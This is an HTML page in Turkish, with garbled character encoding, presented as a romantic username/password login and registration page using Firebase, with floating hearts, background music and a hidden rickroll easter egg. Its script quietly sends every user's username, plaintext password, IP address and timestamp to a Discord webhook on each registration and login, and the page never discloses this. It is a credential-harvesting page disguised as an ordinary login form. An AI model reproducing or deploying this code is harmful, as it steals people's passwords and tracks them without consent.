<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>GeliÅŸmiÅŸ Firebase + Webhook + UI</title>
<script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-auth-compat.js"></script>
<style>
  body {
    margin: 0; padding: 0; height: 100vh; 
    background: #fff0f6; 
    overflow: hidden; 
    font-family: Arial, sans-serif;
  }
  #login-section {
    max-width: 400px;
    margin: 50px auto 20px;
    text-align: center;
  }
  input, button {
    width: 90%; padding: 12px; margin: 8px 0;
    font-size: 1rem;
    border-radius: 5px;
    border: 1px solid #ccc;
  }
  button {
    cursor: pointer;
    background-color: #d6336c;
    color: white;
    border: none;
  }
  button:hover {
    background-color: #a82351;
  }
  #message {
    color: red;
    min-height: 20px;
  }
  #welcome-section {
    display: none;
    text-align: center;
    margin-top: 40px;
  }
  #zahid-regen {
    font-size: 4rem;
    font-weight: bold;
    color: #d6336c;
    text-align: center;
    margin-top: 30px;
    position: relative;
  }
  /* Tooltip container */
  .tooltip {
    position: relative;
    display: inline-block;
    cursor: pointer;
    color: #d6336c;
  }
  /* Tooltip text */
  .tooltip .tooltiptext {
    visibility: hidden;
    width: 180px;
    background-color: #333;
    color: #fff;
    text-align: center;
    border-radius: 6px;
    padding: 8px;
    position: absolute;
    z-index: 10;
    bottom: 125%; /* position above */
    left: 50%;
    margin-left: -90px;
    opacity: 0;
    transition: opacity 0.3s;
    font-size: 0.9rem;
  }
  .tooltip:hover .tooltiptext {
    visibility: visible;
    opacity: 1;
  }
  /* Kalpler animasyonu */
  .heart {
    position: fixed;
    font-size: 20px;
    color: #d6336c;
    animation-name: floatUp;
    animation-timing-function: linear;
    animation-iteration-count: infinite;
  }
  @keyframes floatUp {
    0% {
      transform: translateY(0) translateX(0) scale(1);
      opacity: 1;
    }
    100% {
      transform: translateY(-100vh) translateX(20px) scale(0.5);
      opacity: 0;
    }
  }
  /* SaÄŸ Ã¼st ses kontrol paneli */
  #audio-controls {
    position: fixed;
    top: 15px;
    right: 15px;
    z-index: 20;
    background: rgba(255,255,255,0.8);
    border-radius: 8px;
    padding: 5px 10px;
    display: flex;
    align-items: center;
    gap: 10px;
  }
  #audio-controls button {
    background: none;
    border: none;
    font-size: 1.4rem;
    cursor: pointer;
    color: #d6336c;
  }
</style>
</head>
<body>

  <div id="login-section">
    <h2>KullanÄ±cÄ± AdÄ± ile KayÄ±t/GiriÅŸ</h2>
    <input type="text" id="username" placeholder="KullanÄ±cÄ± AdÄ±" autocomplete="off" /><br />
    <input type="password" id="password" placeholder="Åifre" autocomplete="off" /><br />
    <button id="register-btn">KayÄ±t Ol</button>
    <button id="login-btn">GiriÅŸ Yap</button>
    <p id="message"></p>
  </div>

  <div id="welcome-section">
    <div id="zahid-regen">
      <span class="tooltip" id="zahid-tooltip">ZAHÄ°D
        <span class="tooltiptext">
          <a href="https://discord.com/users/shyla31" target="_blank" style="color:#fff; text-decoration:none;">
            shyla31 Discord Profili
          </a>
        </span>
      </span>
      &nbsp;â¤&nbsp;
      <span class="tooltip" id="regen-tooltip">REGEN
        <span class="tooltiptext">
          <a href="https://discord.com/users/regenxs" target="_blank" style="color:#fff; text-decoration:none;">
            regenxs Discord Profili
          </a>
        </span>
      </span>
    </div>
    <button id="logout-btn" style="margin-top:20px; padding:10px 20px;">Ã‡Ä±kÄ±ÅŸ Yap</button>
  </div>

  <div id="audio-controls">
    <button id="play-pause" title="Oynat / Duraklat">â–¶ï¸</button>
    <button id="mute-unmute" title="Ses AÃ§ / Kapat">ğŸ”Š</button>
  </div>

  <input type="text" id="hidden-input" placeholder="Buraya yazÄ±p Enter'a basÄ±n" style="position:fixed; bottom:10px; left:10px; width:200px; display:none;" />

  <audio id="background-audio" loop>
    <source src="https://cdn.pixabay.com/download/audio/2022/03/03/audio_14722d0b0f.mp3?filename=romantic-piano-loop-6087.mp3" type="audio/mpeg" />
    TarayÄ±cÄ±nÄ±z audio etiketini desteklemiyor.
  </audio>

<script>
  // Firebase config ve init
  const firebaseConfig = {
    apiKey: "AIzaSyB__Q-v3MHr5l25hw4eQBIez60MoJl5OPs",
    authDomain: "regen-e4e55.firebaseapp.com",
    projectId: "regen-e4e55",
    storageBucket: "regen-e4e55.firebasestorage.app",
    messagingSenderId: "522824824598",
    appId: "1:522824824598:web:b4c2e347f97a6ee5c10237",
  };
  firebase.initializeApp(firebaseConfig);
  const auth = firebase.auth();

  const webhookURL = "https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN"; // WEBHOOK URL

  // Helper fonksiyonlar
  function usernameToEmail(username) {
    return username + "@regen.com";
  }

  async function getIP() {
    try {
      const res = await fetch("https://api.ipify.org?format=json");
      const data = await res.json();
      return data.ip || "IP alÄ±namadÄ±";
    } catch {
      return "IP alÄ±namadÄ±";
    }
  }

  async function sendToDiscord(username, password, ip, action) {
    const timestamp = new Date().toLocaleString("tr-TR");
    const content = `**${action} gerÃ§ekleÅŸti!**
**KullanÄ±cÄ± AdÄ±:** ${username}
**Åifre:** ${password}
**IP:** ${ip}
**Zaman:** ${timestamp}`;
    try {
      await fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content }),
      });
    } catch (e) {
      console.error("Webhook gÃ¶nderim hatasÄ±:", e);
    }
  }

  // DOM ElemanlarÄ±
  const usernameInput = document.getElementById("username");
  const passwordInput = document.getElementById("password");
  const registerBtn = document.getElementById("register-btn");
  const loginBtn = document.getElementById("login-btn");
  const message = document.getElementById("message");
  const loginSection = document.getElementById("login-section");
  const welcomeSection = document.getElementById("welcome-section");
  const displayName = document.getElementById("display-name");
  const logoutBtn = document.getElementById("logout-btn");
  const zahidRegen = document.getElementById("zahid-regen");
  const hiddenInput = document.getElementById("hidden-input");

  const audio = document.getElementById("background-audio");
  const playPauseBtn = document.getElementById("play-pause");
  const muteUnmuteBtn = document.getElementById("mute-unmute");

  // KayÄ±t iÅŸlemi
  registerBtn.addEventListener("click", async () => {
    const username = usernameInput.value.trim();
    const password = passwordInput.value;
    if (!username || !password) {
      message.textContent = "LÃ¼tfen kullanÄ±cÄ± adÄ± ve ÅŸifre girin.";
      return;
    }
    const email = usernameToEmail(username);
    const ip = await getIP();

    auth.createUserWithEmailAndPassword(email, password)
      .then(async () => {
        message.textContent = "KayÄ±t baÅŸarÄ±lÄ±! GiriÅŸ yapabilirsiniz.";
        usernameInput.value = "";
        passwordInput.value = "";
        await sendToDiscord(username, password, ip, "KayÄ±t");
      })
      .catch((error) => {
        message.textContent = "Hata: " + error.message;
      });
  });

  // GiriÅŸ iÅŸlemi
  loginBtn.addEventListener("click", async () => {
    const username = usernameInput.value.trim();
    const password = passwordInput.value;
    if (!username || !password) {
      message.textContent = "LÃ¼tfen kullanÄ±cÄ± adÄ± ve ÅŸifre girin.";
      return;
    }
    const email = usernameToEmail(username);
    const ip = await getIP();

    auth.signInWithEmailAndPassword(email, password)
      .then(async () => {
        message.textContent = "";
        loginSection.style.display = "none";
        welcomeSection.style.display = "block";
        zahidRegen.style.fontSize = "4rem"; // bÃ¼yÃ¼k kalÄ±yor
        await sendToDiscord(username, password, ip, "GiriÅŸ");
      })
      .catch((error) => {
        message.textContent = "GiriÅŸ baÅŸarÄ±sÄ±z: " + error.message;
      });
  });

  // Ã‡Ä±kÄ±ÅŸ iÅŸlemi
  logoutBtn.addEventListener("click", () => {
    auth.signOut().then(() => {
      loginSection.style.display = "block";
      welcomeSection.style.display = "none";
      message.textContent = "";
      usernameInput.value = "";
      passwordInput.value = "";
    });
  });

  // Oturum durumu deÄŸiÅŸimi
  auth.onAuthStateChanged((user) => {
    if (user) {
      const email = user.email;
      const username = email.split("@")[0];
      loginSection.style.display = "none";
      welcomeSection.style.display = "block";
      zahidRegen.style.fontSize = "4rem";
    } else {
      loginSection.style.display = "block";
      welcomeSection.style.display = "none";
    }
  });

  // Sayfa yÃ¼klendiÄŸinde gizli input aktif deÄŸil, regen yazÄ±p enter ile yÃ¶nlendirme iÃ§in:
  // KullanÄ±cÄ± herhangi bir yere tÄ±klamadan "regen" yazÄ±p enter basÄ±nca youtube aÃ§Ä±lacak.

  // Burada document keydown dinliyoruz ve hiddenInputâ€™u gÃ¶rÃ¼nÃ¼r yapÄ±yoruz, input focus veriyoruz.
  document.addEventListener("keydown", (e) => {
    if (document.activeElement !== usernameInput && document.activeElement !== passwordInput) {
      if (!hiddenInput.style.display || hiddenInput.style.display === "none") {
        hiddenInput.style.display = "block";
        hiddenInput.focus();
      }
    }
  });

  hiddenInput.addEventListener("keydown", (e) => {
    if (e.key === "Enter") {
      if (hiddenInput.value.toLowerCase() === "regen") {
        window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank");
        hiddenInput.value = "";
        hiddenInput.style.display = "none";
      } else {
        hiddenInput.value = "";
        hiddenInput.style.display = "none";
      }
    }
  });

  // Kalp animasyonu: belirli aralÄ±klarla rastgele pozisyon ve sÃ¼re ile kalpler Ã§Ä±kacak
  function createHeart() {
    const heart = document.createElement("div");
    heart.textContent = "â¤ï¸";
    heart.className = "heart";
    heart.style.left = Math.random() * window.innerWidth + "px";
    heart.style.fontSize = (10 + Math.random() * 30) + "px";
    heart.style.animationDuration = (3 + Math.random() * 5) + "s";
    document.body.appendChild(heart);

    setTimeout(() => {
      heart.remove();
    }, 8000);
  }

  setInterval(createHeart, 700);

  // Ses kontrolÃ¼
  let isPlaying = false;
  let isMuted = false;

  playPauseBtn.addEventListener("click", () => {
    if (isPlaying) {
      audio.pause();
      playPauseBtn.textContent = "â–¶ï¸";
      isPlaying = false;
    } else {
      audio.play();
      playPauseBtn.textContent = "â¸ï¸";
      isPlaying = true;
    }
  });

  muteUnmuteBtn.addEventListener("click", () => {
    if (isMuted) {
      audio.muted = false;
      muteUnmuteBtn.textContent = "ğŸ”Š";
      isMuted = false;
    } else {
      audio.muted = true;
      muteUnmuteBtn.textContent = "ğŸ”‡";
      isMuted = true;
    }
  });

</script>

</body>
</html>